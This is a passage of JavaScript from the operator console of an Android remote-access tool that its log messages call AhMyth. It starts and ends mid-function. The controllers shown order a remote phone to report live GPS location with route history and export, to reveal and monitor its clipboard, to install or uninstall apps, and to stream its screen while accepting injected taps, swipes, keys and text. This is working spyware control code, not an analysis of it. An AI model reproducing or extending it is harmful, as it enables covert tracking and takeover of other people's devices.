            var base64String = window.btoa(binary);

            // Store recording data in scope for SaveAudio
            $MicCtrl.recordingData = data.buffer;
            $MicCtrl.recordingName = data.name || `recording_${Date.now()}.mp3`;

            $MicCtrl.isAudio = false;
            $MicCtrl.$apply();
            sourceMp3.src = "data:audio/mp3;base64," + base64String;
            player.load();
            player.play();



        }

    });
});





//-----------------------Location Controller (location.htm)------------------------
// Location controller - REVAMPED with live tracking, history, routes
app.controller("LocCtrl", function ($scope, $rootScope, $timeout, $interval) {
    var $LocCtrl = $scope;
    var location = CONSTANTS.orders.location;
    
    // State
    $LocCtrl.currentLocation = null;
    $LocCtrl.lastUpdate = null;
    $LocCtrl.locationHistory = [];
    $LocCtrl.isTracking = false;
    $LocCtrl.activeTab = 'current';
    $LocCtrl.load = '';
    
    // Settings
    $LocCtrl.refreshInterval = 10; // seconds
    $LocCtrl.showRoute = true;
    $LocCtrl.showAllMarkers = false;
    $LocCtrl.showHeatmap = false;
    $LocCtrl.mapStyle = 'osm';
    
    // Stats
    $LocCtrl.trackingStats = null;
    
    // Map objects
    var map = null;
    var currentMarker = null;
    var routeLine = null;
    var historyMarkers = [];
    var tileLayer = null;
    var trackingInterval = null;
    var trackingStartTime = null;
    
    // Map tile providers (all free, no API key needed)
    var tileLayers = {
        osm: {
            url: 'https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png',
            attribution: '&copy; <a href="https://www.openstreetmap.org/copyright">OpenStreetMap</a>',
            options: { maxZoom: 19, subdomains: ['a', 'b', 'c'] }
        },
        dark: {
            url: 'https://tiles.stadiamaps.com/tiles/alidade_smooth_dark/{z}/{x}/{y}{r}.png',
            attribution: '&copy; <a href="https://stadiamaps.com/">Stadia Maps</a>',
            options: { maxZoom: 20 }
        },
        satellite: {
            url: 'https://server.arcgisonline.com/ArcGIS/rest/services/World_Imagery/MapServer/tile/{z}/{y}/{x}',
            attribution: '&copy; <a href="https://www.esri.com/">Esri</a>',
            options: { maxZoom: 18 }
        },
        terrain: {
            url: 'https://stamen-tiles-{s}.a.ssl.fastly.net/terrain/{z}/{x}/{y}{r}.png',
            attribution: '&copy; <a href="https://stamen.com/">Stamen Design</a>',
            options: { maxZoom: 18, subdomains: 'abcd' }
        }
    };
    
    // Cleanup on destroy
    $LocCtrl.$on('$destroy', () => {
        socket.removeAllListeners(location);
        if (trackingInterval) {
            $interval.cancel(trackingInterval);
        }
        if (map) {
            map.remove();
            map = null;
        }
    });

    // Initialize map
    function initMap() {
        $timeout(() => {
            const mapContainer = document.getElementById('mapid');
            if (mapContainer && !map) {
                try {
                    map = L.map('mapid', {
                        center: [40.7128, -74.0060], // Default NYC
                        zoom: 13,
                        zoomControl: true,
                        attributionControl: true
                    });
                    
                    // Add default tile layer
                    changeMapStyle('osm');
                    
                    // Resize handling
                    var resizeMap = function() {
                        if (map) map.invalidateSize(true);
                    };
                    [100, 300, 500, 1000].forEach(delay => setTimeout(resizeMap, delay));
                    window.addEventListener('resize', resizeMap);
                    
                    $rootScope.Log('[✓] Map initialized', CONSTANTS.logStatus.SUCCESS);
                } catch (e) {
                    console.error('[AhMyth] Map error:', e);
                    $rootScope.Log('[✗] Map failed: ' + e.message, CONSTANTS.logStatus.FAIL);
                }
            } else if (!mapContainer) {
                $timeout(initMap, 200);
            }
        }, 100);
    }
    
    // Change map style
    function changeMapStyle(style) {
        if (!map) return;
        
        var config = tileLayers[style] || tileLayers.osm;
        
        if (tileLayer) {
            map.removeLayer(tileLayer);
        }
        
        tileLayer = L.tileLayer(config.url, {
            attribution: config.attribution,
            ...config.options
        }).addTo(map);
    }
    $LocCtrl.changeMapStyle = () => changeMapStyle($LocCtrl.mapStyle);
    
    // Create marker
    function createMarker(lat, lng, isCurrent = true) {
        var color = isCurrent ? '#00d4aa' : '#6366f1';
        var size = isCurrent ? 24 : 12;
        
        var icon = L.divIcon({
            className: 'custom-marker',
            html: `<div style="
                width: ${size}px; 
                height: ${size}px; 
                background: ${color}; 
                border: 3px solid #fff; 
                border-radius: 50%; 
                box-shadow: 0 0 ${isCurrent ? 15 : 5}px ${color}80;
                ${isCurrent ? 'animation: pulse-marker 2s infinite;' : ''}
            "></div>`,
            iconSize: [size, size],
            iconAnchor: [size/2, size/2]
        });
        
        return L.marker([lat, lng], { icon: icon });
    }
    
    // Update route line
    function updateRoute() {
        if (!map) return;
        
        // Remove existing route
        if (routeLine) {
            map.removeLayer(routeLine);
            routeLine = null;
        }
        
        if ($LocCtrl.showRoute && $LocCtrl.locationHistory.length > 1) {
            var points = $LocCtrl.locationHistory.map(loc => [loc.lat, loc.lng]);
            
            routeLine = L.polyline(points, {
                color: '#00d4aa',
                weight: 3,
                opacity: 0.8,
                dashArray: '10, 10',
                lineJoin: 'round'
            }).addTo(map);
        }
    }
    $LocCtrl.updateRoute = updateRoute;
    
    // Update history markers
    function updateMarkers() {
        if (!map) return;
        
        // Remove existing history markers
        historyMarkers.forEach(m => map.removeLayer(m));
        historyMarkers = [];
        
        if ($LocCtrl.showAllMarkers && $LocCtrl.locationHistory.length > 0) {
            $LocCtrl.locationHistory.forEach((loc, index) => {
                if (index < $LocCtrl.locationHistory.length - 1) { // Skip current
                    var marker = createMarker(loc.lat, loc.lng, false);
                    marker.bindPopup(`
                        <b>Point #${index + 1}</b><br>
                        Lat: ${loc.lat.toFixed(6)}<br>
                        Lng: ${loc.lng.toFixed(6)}<br>
                        Time: ${loc.time}
                    `);
                    marker.addTo(map);
                    historyMarkers.push(marker);
                }
            });
        }
    }
    $LocCtrl.updateMarkers = updateMarkers;
    
    // Calculate distance between two points (Haversine formula)
    function calculateDistance(lat1, lng1, lat2, lng2) {
        var R = 6371; // Earth's radius in km
        var dLat = (lat2 - lat1) * Math.PI / 180;
        var dLng = (lng2 - lng1) * Math.PI / 180;
        var a = Math.sin(dLat/2) * Math.sin(dLat/2) +
                Math.cos(lat1 * Math.PI / 180) * Math.cos(lat2 * Math.PI / 180) *
                Math.sin(dLng/2) * Math.sin(dLng/2);
        var c = 2 * Math.atan2(Math.sqrt(a), Math.sqrt(1-a));
        return R * c;
    }
    
    // Calculate tracking stats
    function updateStats() {
        if ($LocCtrl.locationHistory.length < 1) {
            $LocCtrl.trackingStats = null;
            return;
        }
        
        var totalDistance = 0;
        for (var i = 1; i < $LocCtrl.locationHistory.length; i++) {
            var prev = $LocCtrl.locationHistory[i-1];
            var curr = $LocCtrl.locationHistory[i];
            totalDistance += calculateDistance(prev.lat, prev.lng, curr.lat, curr.lng);
        }
        
        var duration = trackingStartTime ? Date.now() - trackingStartTime : 0;
        var hours = Math.floor(duration / 3600000);
        var minutes = Math.floor((duration % 3600000) / 60000);
        var seconds = Math.floor((duration % 60000) / 1000);
        
        var avgSpeed = duration > 0 ? (totalDistance / (duration / 3600000)) : 0;
        
        $LocCtrl.trackingStats = {
            totalDistance: totalDistance.toFixed(2),
            duration: `${hours.toString().padStart(2, '0')}:${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`,
            avgSpeed: avgSpeed.toFixed(1)
        };
    }
    
    // Refresh location
    $LocCtrl.refreshLocation = function() {
        $LocCtrl.load = 'loading';
        $rootScope.Log('[→] Requesting GPS location...', CONSTANTS.logStatus.INFO);
        socket.emit(ORDER, { order: location });
    };
    
    // Toggle live tracking
    $LocCtrl.toggleTracking = function() {
        if ($LocCtrl.isTracking) {
            // Stop tracking
            $LocCtrl.isTracking = false;
            if (trackingInterval) {
                $interval.cancel(trackingInterval);
                trackingInterval = null;
            }
            $rootScope.Log('[⏹] Location tracking stopped', CONSTANTS.logStatus.INFO);
        } else {
            // Start tracking
            $LocCtrl.isTracking = true;
            trackingStartTime = Date.now();
            $LocCtrl.refreshLocation();
            
            trackingInterval = $interval(() => {
                if ($LocCtrl.isTracking) {
                    $LocCtrl.refreshLocation();
                }
            }, $LocCtrl.refreshInterval * 1000);
            
            $rootScope.Log(`[▶] Location tracking started (${$LocCtrl.refreshInterval}s interval)`, CONSTANTS.logStatus.SUCCESS);
        }
    };
    
    // Toggle route visibility
    $LocCtrl.toggleRoute = function() {
        $LocCtrl.showRoute = !$LocCtrl.showRoute;
        updateRoute();
    };
    
    // Toggle heatmap
    $LocCtrl.toggleHeatmap = function() {
        $LocCtrl.showHeatmap = !$LocCtrl.showHeatmap;
        // Heatmap requires additional Leaflet plugin - simplified version
        if ($LocCtrl.showHeatmap) {
            $LocCtrl.showAllMarkers = true;
            updateMarkers();
        }
    };
    
    // Center on device
    $LocCtrl.centerOnDevice = function() {
        if (map && $LocCtrl.currentLocation) {
            map.setView([parseFloat($LocCtrl.currentLocation.lat), parseFloat($LocCtrl.currentLocation.lng)], 16);
        }
    };
    
    // Fit all points
    $LocCtrl.fitAllPoints = function() {
        if (map && $LocCtrl.locationHistory.length > 0) {
            var bounds = L.latLngBounds($LocCtrl.locationHistory.map(loc => [loc.lat, loc.lng]));
            map.fitBounds(bounds, { padding: [30, 30] });
        }
    };
    
    // Focus on specific location
    $LocCtrl.focusOnLocation = function(loc) {
        if (map) {
            map.setView([loc.lat, loc.lng], 17);
        }
    };
    
    // Open in Google Maps
    $LocCtrl.openInGoogleMaps = function() {
        if ($LocCtrl.currentLocation) {
            var url = `https://www.google.com/maps?q=${$LocCtrl.currentLocation.lat},${$LocCtrl.currentLocation.lng}`;
            require('electron').shell.openExternal(url);
        }
    };
    
    // Copy coordinates
    $LocCtrl.copyCoordinates = function() {
        if ($LocCtrl.currentLocation) {
            var coords = `${$LocCtrl.currentLocation.lat}, ${$LocCtrl.currentLocation.lng}`;
            require('electron').clipboard.writeText(coords);
            $rootScope.Log('[✓] Coordinates copied to clipboard', CONSTANTS.logStatus.SUCCESS);
        }
    };
    
    // Export history as JSON
    $LocCtrl.exportHistory = function() {
        if ($LocCtrl.locationHistory.length === 0) return;
        
        var data = {
            device: originalSocket.deviceId || 'unknown',
            exportDate: new Date().toISOString(),
            pointCount: $LocCtrl.locationHistory.length,
            stats: $LocCtrl.trackingStats,
            locations: $LocCtrl.locationHistory
        };
        
        var filename = `location-history-${Date.now()}.json`;
        var filePath = path.join(downloadsPath, filename);
        fs.writeFileSync(filePath, JSON.stringify(data, null, 2));
        
        $rootScope.Log(`[✓] History exported: ${filename}`, CONSTANTS.logStatus.SUCCESS);
    };
    
    // Export as KML
    $LocCtrl.exportAsKML = function() {
        if ($LocCtrl.locationHistory.length === 0) return;
        
        var kml = `<?xml version="1.0" encoding="UTF-8"?>
<kml xmlns="http://www.opengis.net/kml/2.2">
  <Document>
    <name>AhMyth Location History</name>
    <description>Exported on ${new Date().toISOString()}</description>
    <Style id="trackStyle">
      <LineStyle>
        <color>ff00d4aa</color>
        <width>3</width>
      </LineStyle>
      <IconStyle>
        <Icon><href>http://maps.google.com/mapfiles/kml/shapes/placemark_circle.png</href></Icon>
      </IconStyle>
    </Style>
    <Placemark>
      <name>Device Route</name>
      <styleUrl>#trackStyle</styleUrl>
      <LineString>
        <coordinates>
${$LocCtrl.locationHistory.map(loc => `          ${loc.lng},${loc.lat},${loc.altitude || 0}`).join('\n')}
        </coordinates>
      </LineString>
    </Placemark>
${$LocCtrl.locationHistory.map((loc, i) => `    <Placemark>
      <name>Point ${i + 1}</name>
      <description>${loc.time}</description>
      <styleUrl>#trackStyle</styleUrl>
      <Point><coordinates>${loc.lng},${loc.lat},${loc.altitude || 0}</coordinates></Point>
    </Placemark>`).join('\n')}
  </Document>
</kml>`;
        
        var filename = `location-history-${Date.now()}.kml`;
        var filePath = path.join(downloadsPath, filename);
        fs.writeFileSync(filePath, kml);
        
        $rootScope.Log(`[✓] KML exported: ${filename}`, CONSTANTS.logStatus.SUCCESS);
    };
    
    // Clear history
    $LocCtrl.clearHistory = function() {
        $LocCtrl.locationHistory = [];
        trackingStartTime = null;
        $LocCtrl.trackingStats = null;
        
        historyMarkers.forEach(m => map.removeLayer(m));
        historyMarkers = [];
        
        if (routeLine) {
            map.removeLayer(routeLine);
            routeLine = null;
        }
        
        $rootScope.Log('[✓] Location history cleared', CONSTANTS.logStatus.INFO);
    };
    
    // Request permission
    $LocCtrl.requestPermission = function(type) {
        socket.emit(ORDER, { order: 'x0000rp', extra: type });
        $rootScope.Log(`[→] Requesting ${type} permission...`, CONSTANTS.logStatus.INFO);
    };
    
    // Handle location response
    socket.on(location, (data) => {
        $LocCtrl.load = '';
        
        if (data.enable) {
            if (data.lat == 0 && data.lng == 0) {
                $rootScope.Log('[⚠] Location unavailable', CONSTANTS.logStatus.WARNING);
            } else {
                $rootScope.Log(`[✓] Location: ${data.lat.toFixed(6)}, ${data.lng.toFixed(6)}`, CONSTANTS.logStatus.SUCCESS);
                
                // Update current location with all available data
                $LocCtrl.currentLocation = {
                    lat: data.lat.toFixed(6),
                    lng: data.lng.toFixed(6),
                    accuracy: data.accuracy ? Math.round(data.accuracy) + 'm' : null,
                    altitude: data.altitude ? Math.round(data.altitude) : null,
                    speed: data.speed ? (data.speed * 3.6).toFixed(1) : null, // m/s to km/h
                    provider: data.provider || null
                };
                $LocCtrl.lastUpdate = new Date().toLocaleTimeString();
                
                // Add to history
                var historyPoint = {
                    lat: data.lat,
                    lng: data.lng,
                    accuracy: data.accuracy ? Math.round(data.accuracy) : null,
                    altitude: data.altitude ? Math.round(data.altitude) : null,
                    speed: data.speed || null,
                    provider: data.provider || null,
                    timestamp: Date.now(),
                    time: new Date().toLocaleTimeString()
                };
                $LocCtrl.locationHistory.push(historyPoint);
                
                // Update stats
                updateStats();
                
                // Update map
                if (map) {
                    var latlng = L.latLng(data.lat, data.lng);
                    
                    if (!currentMarker) {
                        currentMarker = createMarker(data.lat, data.lng, true);
                        currentMarker.addTo(map);
                    } else {
                        currentMarker.setLatLng(latlng);
                    }
                    
                    currentMarker.bindPopup(`
                        <b>Current Location</b><br>
                        Lat: ${data.lat.toFixed(6)}<br>
                        Lng: ${data.lng.toFixed(6)}<br>
                        ${data.accuracy ? `Accuracy: ±${Math.round(data.accuracy)}m<br>` : ''}
                        ${data.altitude ? `Altitude: ${Math.round(data.altitude)}m<br>` : ''}
                        ${data.provider ? `Provider: ${data.provider}` : ''}
                    `);
                    
                    map.setView(latlng, map.getZoom() < 14 ? 15 : map.getZoom());
                    
                    // Update route and markers
                    updateRoute();
                    if ($LocCtrl.showAllMarkers) updateMarkers();
                    
                    setTimeout(() => map.invalidateSize(), 100);
                }
            }
        } else {
            $rootScope.Log('[✗] Location disabled on device', CONSTANTS.logStatus.FAIL);
        }
        
        if (!$LocCtrl.$$phase) $LocCtrl.$apply();
    });
    
    // Initialize
    initMap();
    
    // Auto-request on load
    $timeout(() => {
        $LocCtrl.refreshLocation();
    }, 500);
});

//-----------------------Device Info Controller------------------------
app.controller("DeviceInfoCtrl", function ($scope, $rootScope) {
    $DeviceInfoCtrl = $scope;
    $DeviceInfoCtrl.deviceInfo = null;
    var deviceInfo = CONSTANTS.orders.deviceInfo;

    $DeviceInfoCtrl.$on('$destroy', () => {
        socket.removeAllListeners(deviceInfo);
    });

    $DeviceInfoCtrl.getDeviceInfo = () => {
        $rootScope.Log('[→] Fetching device information...', CONSTANTS.logStatus.INFO);
        socket.emit(ORDER, { order: deviceInfo });
    };

    socket.on(deviceInfo, (data) => {
        $rootScope.Log('[✓] Device information received', CONSTANTS.logStatus.SUCCESS);
        $DeviceInfoCtrl.deviceInfo = data;
        $DeviceInfoCtrl.$apply();
    });

    // Auto-load on init
    $DeviceInfoCtrl.getDeviceInfo();
});

//-----------------------Apps Controller------------------------
app.controller("AppsCtrl", function ($scope, $rootScope) {
    $AppsCtrl = $scope;
    $AppsCtrl.appsList = [];
    $AppsCtrl.load = 'loading';
    var apps = CONSTANTS.orders.apps;

    $AppsCtrl.$on('$destroy', () => {
        socket.removeAllListeners(apps);
    });

    $AppsCtrl.getApps = () => {
        $AppsCtrl.load = 'loading';
        $rootScope.Log('[→] Fetching installed apps...', CONSTANTS.logStatus.INFO);
        socket.emit(ORDER, { order: apps });
    };

    $AppsCtrl.barLimit = 50;
    $AppsCtrl.increaseLimit = () => {
        $AppsCtrl.barLimit += 50;
    };

    // Install app from file path - with file picker
    $AppsCtrl.installApp = () => {
        const { remote } = require('electron');
        const { dialog } = remote || require('@electron/remote');
        if (!dialog) {
            const apkPath = prompt('Enter APK file path on device:');
            if (!apkPath || apkPath.trim() === '') {
                $rootScope.Log('[✗] No file path provided', CONSTANTS.logStatus.FAIL);
                return;
            }
            $rootScope.Log(`[→] Installing app from: ${apkPath}`, CONSTANTS.logStatus.INFO);
            socket.emit(ORDER, { order: CONSTANTS.orders.installApp, apkPath: apkPath.trim() });
            return;
        }
        
        dialog.showOpenDialog({
            title: 'Select APK file to install on device',
            filters: [
                { name: 'APK files', extensions: ['apk'] },
                { name: 'All files', extensions: ['*'] }
            ],
            properties: ['openFile']
        }).then(result => {
            if (!result.canceled && result.filePaths.length > 0) {
                const filePath = result.filePaths[0];
                $rootScope.Log(`[→] Selected APK: ${filePath}`, CONSTANTS.logStatus.INFO);
                // Note: For remote install, we need to upload the file or provide device path
                // For now, we'll ask for device path after file selection
                const devicePath = prompt(`Enter path on device where APK should be located:\n(Selected: ${filePath})`);
                if (devicePath && devicePath.trim() !== '') {
                    $rootScope.Log(`[→] Installing app from device path: ${devicePath}`, CONSTANTS.logStatus.INFO);
                    socket.emit(ORDER, { order: CONSTANTS.orders.installApp, apkPath: devicePath.trim() });
                }
            }
        }).catch(err => {
            $rootScope.Log(`[✗] File selection cancelled or error: ${err.message}`, CONSTANTS.logStatus.FAIL);
        });
    };

    // Uninstall app by package name
    $AppsCtrl.uninstallApp = (packageName, appName) => {
        if (!packageName || packageName.trim() === '') {
            $rootScope.Log('[✗] Please provide a package name', CONSTANTS.logStatus.FAIL);
            return;
        }
        const confirmMsg = `Are you sure you want to uninstall "${appName || packageName}"?`;
        if (confirm(confirmMsg)) {
            $rootScope.Log(`[→] Uninstalling app: ${packageName}`, CONSTANTS.logStatus.INFO);
            socket.emit(ORDER, { order: CONSTANTS.orders.uninstallApp, packageName: packageName });
        }
    };

    socket.on(apps, (data) => {
        $AppsCtrl.load = '';
        if (data.appsList) {
            $rootScope.Log(`[✓] Apps list received: ${data.appsList.length} apps`, CONSTANTS.logStatus.SUCCESS);
            $AppsCtrl.appsList = data.appsList;
            $AppsCtrl.$apply();
        }
    });

    // Handle install app response
    socket.on(CONSTANTS.orders.installApp, (data) => {
        if (data.success) {
            $rootScope.Log(`[✓] ${data.message}`, CONSTANTS.logStatus.SUCCESS);
        } else {
            $rootScope.Log(`[✗] Installation failed: ${data.error}`, CONSTANTS.logStatus.FAIL);
        }
        $AppsCtrl.$apply();
    });

    // Handle uninstall app response
    socket.on(CONSTANTS.orders.uninstallApp, (data) => {
        if (data.success) {
            $rootScope.Log(`[✓] ${data.message}`, CONSTANTS.logStatus.SUCCESS);
            // Refresh apps list after uninstall
            setTimeout(() => {
                $AppsCtrl.getApps();
            }, 2000);
        } else {
            $rootScope.Log(`[✗] Uninstallation failed: ${data.error}`, CONSTANTS.logStatus.FAIL);
        }
        $AppsCtrl.$apply();
    });

    // Auto-load on init
    $AppsCtrl.getApps();
});

//-----------------------Clipboard Controller------------------------
app.controller("ClipboardCtrl", function ($scope, $rootScope) {
    $ClipboardCtrl = $scope;
    $ClipboardCtrl.clipboardText = '';
    $ClipboardCtrl.isMonitoring = false;
    var clipboard = CONSTANTS.orders.clipboard;

    $ClipboardCtrl.$on('$destroy', () => {
        socket.removeAllListeners(clipboard);
    });

    $ClipboardCtrl.getClipboard = () => {
        $rootScope.Log('[→] Fetching clipboard content...', CONSTANTS.logStatus.INFO);
        socket.emit(ORDER, { order: clipboard, extra: 'get' });
    };

    $ClipboardCtrl.startMonitoring = () => {
        $ClipboardCtrl.isMonitoring = true;
        $rootScope.Log('[✓] Clipboard monitoring started', CONSTANTS.logStatus.SUCCESS);
        socket.emit(ORDER, { order: clipboard, extra: 'start' });
    };

    $ClipboardCtrl.stopMonitoring = () => {
        $ClipboardCtrl.isMonitoring = false;
        $rootScope.Log('[→] Clipboard monitoring stopped', CONSTANTS.logStatus.INFO);
        socket.emit(ORDER, { order: clipboard, extra: 'stop' });
    };

    socket.on(clipboard, (data) => {
        if (data.hasData && data.text) {
            $ClipboardCtrl.clipboardText = data.text;
            if ($ClipboardCtrl.isMonitoring && data.timestamp) {
                $rootScope.Log(`[ℹ] Clipboard changed: ${data.text.substring(0, 50)}...`, CONSTANTS.logStatus.INFO);
            } else {
                $rootScope.Log('[✓] Clipboard content received', CONSTANTS.logStatus.SUCCESS);
            }
            $ClipboardCtrl.$apply();
        } else {
            $ClipboardCtrl.clipboardText = '';
            $rootScope.Log('[ℹ] Clipboard is empty', CONSTANTS.logStatus.INFO);
            $ClipboardCtrl.$apply();
        }
    });

    // Auto-load on init
    $ClipboardCtrl.getClipboard();
});

//-----------------------WiFi Controller------------------------
app.controller("WiFiCtrl", function ($scope, $rootScope) {
    $WiFiCtrl = $scope;
    $WiFiCtrl.wifiInfo = null;
    var wifi = CONSTANTS.orders.wifi;

    $WiFiCtrl.$on('$destroy', () => {
        socket.removeAllListeners(wifi);
    });

    $WiFiCtrl.getWiFiInfo = () => {
        $rootScope.Log('[→] Fetching WiFi information...', CONSTANTS.logStatus.INFO);
        socket.emit(ORDER, { order: wifi });
    };

    socket.on(wifi, (data) => {
        if (data.enabled) {
            $rootScope.Log('[✓] WiFi information received', CONSTANTS.logStatus.SUCCESS);
        } else {
            $rootScope.Log('[⚠] WiFi is disabled on device', CONSTANTS.logStatus.WARNING);
        }
        $WiFiCtrl.wifiInfo = data;
        $WiFiCtrl.$apply();
    });

    // Auto-load on init
    $WiFiCtrl.getWiFiInfo();
});

//-----------------------Screen Controller (screen.html)------------------------
// Remote Desktop / VNC-like Controller with Touch Input
app.controller("ScreenCtrl", function ($scope, $rootScope, $interval, $timeout) {
    $ScreenCtrl = $scope;
    var screen = CONSTANTS.orders.screen || 'x0000sc';
    var input = CONSTANTS.orders.input || 'x0000in';
    
    // State
    $ScreenCtrl.isStreaming = false;
    $ScreenCtrl.isLoading = false;
    $ScreenCtrl.currentFrame = null;
    $ScreenCtrl.screenInfo = { width: 1080, height: 1920 };
    $ScreenCtrl.permissionRequired = false;
    $ScreenCtrl.awaitingPermission = false;  // Prevent permission spam
    $ScreenCtrl.permissionGranted = false;
    $ScreenCtrl.frameCount = 0;
    $ScreenCtrl.lastFrameSize = 0;
    $ScreenCtrl.actualFps = 0;
    
    // Touch control
    $ScreenCtrl.touchEnabled = true;
    $ScreenCtrl.lastTouchPos = null;
    $ScreenCtrl.inputLog = [];
    $ScreenCtrl.textToSend = '';
    
    // Settings
    $ScreenCtrl.quality = '50';
    $ScreenCtrl.fps = '250'; // ms between frames
    
    var streamInterval = null;
    var canvas = null;
    var ctx = null;
    var fpsCounter = 0;
    var fpsTimer = null;
    var isDragging = false;
    var dragStart = null;
    
    $ScreenCtrl.$on('$destroy', () => {
        socket.removeAllListeners(screen);
        socket.removeAllListeners(input);
        if (streamInterval) $interval.cancel(streamInterval);
        if (fpsTimer) $interval.cancel(fpsTimer);
        if (fullscreenUpdateInterval) $interval.cancel(fullscreenUpdateInterval);
        if (fullscreenWindow && !fullscreenWindow.closed) {
            fullscreenWindow.close();
        }
    });
    
    // Initialize canvas
    function initCanvas() {
        canvas = document.getElementById('screenCanvas');
        if (canvas) {
            ctx = canvas.getContext('2d');
        }
    }
    
    // Get canvas coordinates normalized to screen dimensions
    function getCanvasCoords(event) {
        if (!canvas) return null;
        
        var rect = canvas.getBoundingClientRect();
        
        // Get the actual displayed size of the canvas
        var displayedWidth = rect.width;
        var displayedHeight = rect.height;
        
        // Get the internal canvas dimensions
        var canvasWidth = canvas.width;
        var canvasHeight = canvas.height;
        
        // Calculate the scale factor between displayed and internal canvas
        var scaleX = canvasWidth / displayedWidth;
        var scaleY = canvasHeight / displayedHeight;
        
        // Get click position relative to the displayed canvas
        var clickX = event.clientX - rect.left;
        var clickY = event.clientY - rect.top;
        
        // Convert to internal canvas coordinates
        var canvasX = clickX * scaleX;
        var canvasY = clickY * scaleY;
        
        // Normalize to 0-1 range for device screen mapping
        // Canvas dimensions should match device screen dimensions
        var normX = canvasX / canvasWidth;
        var normY = canvasY / canvasHeight;
        
        // Ensure coordinates are within bounds
        normX = Math.max(0, Math.min(1, normX));
        normY = Math.max(0, Math.min(1, normY));
        
        // Get actual device screen dimensions for reference
        var screenWidth = $ScreenCtrl.screenInfo.width || canvasWidth;
        var screenHeight = $ScreenCtrl.screenInfo.height || canvasHeight;
        
        return {
            x: normX,
            y: normY,
            pixelX: Math.round(canvasX),
            pixelY: Math.round(canvasY),
            screenX: clickX,
            screenY: clickY,
            deviceX: Math.round(normX * screenWidth),
            deviceY: Math.round(normY * screenHeight),
            canvasWidth: canvasWidth,
            canvasHeight: canvasHeight,
            displayedWidth: displayedWidth,
            displayedHeight: displayedHeight
        };
    }
    
    // Show touch indicator
    function showTouchIndicator(x, y) {
        $ScreenCtrl.lastTouchPos = { x: x, y: y };
        $timeout(() => {
            $ScreenCtrl.lastTouchPos = null;
        }, 500);
    }
    
    // Add to input log
    function logInput(action, detail) {
        $ScreenCtrl.inputLog.unshift({ action: action, detail: detail });
        if ($ScreenCtrl.inputLog.length > 10) {
            $ScreenCtrl.inputLog.pop();
        }
    }
    
    // Render frame to canvas
    function renderFrame(base64Image, width, height) {
        if (!canvas || !ctx) {
            initCanvas();
        }
        
        if (!canvas || !ctx) {
            console.error('[AhMyth] Canvas not initialized');
            return;
        }
        
        var img = new Image();
        img.onload = function() {
            // Get container dimensions
            var container = document.getElementById('canvasContainer');
            if (!container) {
                console.error('[AhMyth] Canvas container not found');
                return;
            }
            
            var containerWidth = container.clientWidth;
            var containerHeight = container.clientHeight;
            
            // Get actual image dimensions
            var imgWidth = width || img.width;
            var imgHeight = height || img.height;
            
            // Calculate aspect ratios
            var imgAspect = imgWidth / imgHeight;
            var containerAspect = containerWidth / containerHeight;
            
            // Calculate canvas size to fit container while maintaining aspect ratio
            var canvasWidth, canvasHeight;
            if (containerAspect > imgAspect) {
                // Container is wider, fit to height
                canvasHeight = containerHeight;
                canvasWidth = canvasHeight * imgAspect;
            } else {
                // Container is taller, fit to width
                canvasWidth = containerWidth;
                canvasHeight = canvasWidth / imgAspect;
            }
            
            // Set canvas size
            canvas.width = canvasWidth;
            canvas.height = canvasHeight;
            
            // Clear and draw image scaled to fit
            ctx.clearRect(0, 0, canvas.width, canvas.height);
            ctx.drawImage(img, 0, 0, canvasWidth, canvasHeight);
            
            $ScreenCtrl.currentFrame = base64Image;
            fpsCounter++;
            
            // Update fullscreen window if open
            if (fullscreenWindow && !fullscreenWindow.isDestroyed()) {
                updateFullscreenFrame();
            }
            
            if (!$ScreenCtrl.$$phase) {
                $ScreenCtrl.$apply();
            }
        };
        img.onerror = function(err) {
            console.error('[AhMyth] Failed to load image', err);
        };
        img.src = 'data:image/jpeg;base64,' + base64Image;
    }
    
    // ============ Touch/Input Handlers ============
    
    $ScreenCtrl.handleClick = (event) => {
        if (!$ScreenCtrl.touchEnabled || isDragging) return;
        
        var coords = getCanvasCoords(event);
        if (!coords) return;
        
        showTouchIndicator(coords.screenX, coords.screenY);
        logInput('TAP', `${(coords.x * 100).toFixed(0)}%, ${(coords.y * 100).toFixed(0)}%`);
        
        socket.emit(ORDER, {
            order: input,
            action: 'tap',
            x: coords.x,
            y: coords.y,
            normalized: true
        });
    };
    
    $ScreenCtrl.handleMouseDown = (event) => {
        if (!$ScreenCtrl.touchEnabled) return;
        dragStart = getCanvasCoords(event);
        isDragging = false;
    };
    
    $ScreenCtrl.handleMouseMove = (event) => {
        if (!$ScreenCtrl.touchEnabled || !dragStart) return;
        var coords = getCanvasCoords(event);
        if (!coords) return;
        
        // Check if movement is significant enough to be a drag
        var dx = Math.abs(coords.x - dragStart.x);
        var dy = Math.abs(coords.y - dragStart.y);
        if (dx > 0.02 || dy > 0.02) {
            isDragging = true;
        }
    };
    
    $ScreenCtrl.handleMouseUp = (event) => {
        if (!$ScreenCtrl.touchEnabled) return;
        
        if (isDragging && dragStart) {
            var endCoords = getCanvasCoords(event);
            if (endCoords) {
                logInput('SWIPE', `${(dragStart.x * 100).toFixed(0)}%→${(endCoords.x * 100).toFixed(0)}%`);
                
                socket.emit(ORDER, {
                    order: input,
                    action: 'swipe',
                    startX: dragStart.x,
                    startY: dragStart.y,
                    endX: endCoords.x,
                    endY: endCoords.y,
                    duration: 300,
                    normalized: true
                });
            }
        }
        
        dragStart = null;
        isDragging = false;
    };
    
    $ScreenCtrl.sendKey = (key) => {
        if (!key) {
            console.warn('[AhMyth] sendKey called with no key');
            return;
        }
        
        console.log('[AhMyth] sendKey called with:', key);
        
        // Check socket connection
        var isConnected = false;
        if (originalSocket) {
            if (typeof originalSocket.connected === 'function') {
                isConnected = originalSocket.connected();
            } else {
                isConnected = originalSocket.connected === true;
            }
        }
        
        if (!isConnected) {
            $rootScope.Log('[✗] Not connected to device!', CONSTANTS.logStatus.FAIL);
            console.error('[AhMyth] Socket not connected');
            return;
        }
        
        logInput('KEY', key.toUpperCase());
        
        // Ensure key is sent as lowercase string (Android expects lowercase)
        var keyStr = String(key).toLowerCase();
        
        console.log('[AhMyth] Emitting key command:', {
            order: input,
            action: 'key',
            key: keyStr
        });
        
        socket.emit(ORDER, {
            order: input,
            action: 'key',
            key: keyStr
        });
        
        $rootScope.Log(`[→] Sending key: ${keyStr}`, CONSTANTS.logStatus.INFO);
    };
    
    $ScreenCtrl.sendText = () => {
        if (!$ScreenCtrl.textToSend) return;
        
        logInput('TEXT', $ScreenCtrl.textToSend.substring(0, 20) + '...');
        socket.emit(ORDER, {
            order: input,
            action: 'text',
            text: $ScreenCtrl.textToSend
